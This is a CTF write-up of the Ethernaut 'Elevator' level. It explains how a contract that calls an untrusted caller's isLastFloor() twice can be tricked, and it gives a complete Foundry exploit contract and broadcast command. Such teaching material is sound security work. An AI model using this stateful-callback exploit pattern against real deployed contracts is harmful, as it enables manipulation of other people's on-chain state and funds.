---
title: 'Elevator - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level11.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-19
lastmod: 2025-09-19
---

## Challenge Overview

This level involves an Elevator contract that uses an external Building interface to determine if a floor is the top floor. The goal is to reach the top of the building by manipulating the return values of the `isLastFloor()` function to bypass the contract's logic.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

---

## Exploit Explanation

The vulnerability exists because the `goTo()` function calls the external `isLastFloor()` function **twice** and assumes it will return consistent results:

```solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {  // First call
        floor = _floor;
        top = building.isLastFloor(floor);  // Second call
    }
}
```

Since we control the `Building` implementation, we can return different values for each call:
1. **First call**: Return `false` to pass the `if` condition and enter the block
2. **Second call**: Return `true` to set `top = true`

This allows us to bypass the intended logic and reach the top floor regardless of the actual floor number.

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Elevator.sol";

contract EvilBuilding {
    bool private evilSwitch;
    Elevator public elevatorInstance = Elevator(<YOUR_INSTANCE>);

    function attack() public {
        // Trigger the goTo() function with any floor number
        elevatorInstance.goTo(999);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        // First call: return false to pass the if condition
        if(!evilSwitch){
            evilSwitch = true;
            return false;
        } else {
            // Second call: return true to set top = true
            return true;
        }
    }
}

contract ElevatorSolution is Script {
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Deploy the malicious Building contract
        EvilBuilding evil = new EvilBuilding();
        
        // Execute the attack
        evil.attack();
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/ElevatorSolution.s.sol --rpc-url $SEPOLIA_URL --tc ElevatorSolution --broadcast
```